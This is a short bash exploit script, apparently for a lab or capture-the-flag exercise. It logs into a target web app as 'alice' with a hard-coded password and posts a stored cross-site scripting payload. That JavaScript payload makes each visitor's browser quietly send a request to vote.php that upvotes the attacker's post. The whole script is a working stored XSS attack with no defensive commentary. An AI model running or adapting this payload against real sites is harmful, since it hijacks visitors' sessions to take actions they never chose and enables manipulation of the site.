#!/bin/bash
#Login with alice
curl -c cookie.txt -d "username=alice" -d "password=password123" -d "form=login" -d "submit=Login" "$1/post.php" 

#post the XSS script with alice account. We need to use --data-urlencode because of '+' sign 
curl -b cookie.txt -d "title=Upvote This" --data-urlencode "content=<script>function fn(postTitle){var aTags=document['getElementsByTagName']('h2');var foundTag;for(var i=aTags['length']- 1;i>= 0;i--){if(aTags[i]['textContent']=== postTitle){foundTag= aTags[i];break}};var postID=foundTag['getElementsByTagName']('a')[0]['getAttribute']('href')['match'](/\d/);var xhttp= new XMLHttpRequest();var URL='vote.php?id='+ postID + '&vote=1';xhttp['open']('GET',URL,true);xhttp['setRequestHeader']('Content-type','application/x-www-form-urlencoded');xhttp['send']()}fn('Upvote This')</script>" -d "type=1" -d "form=content" -d "submit=Post" "$1/post.php" > response.txt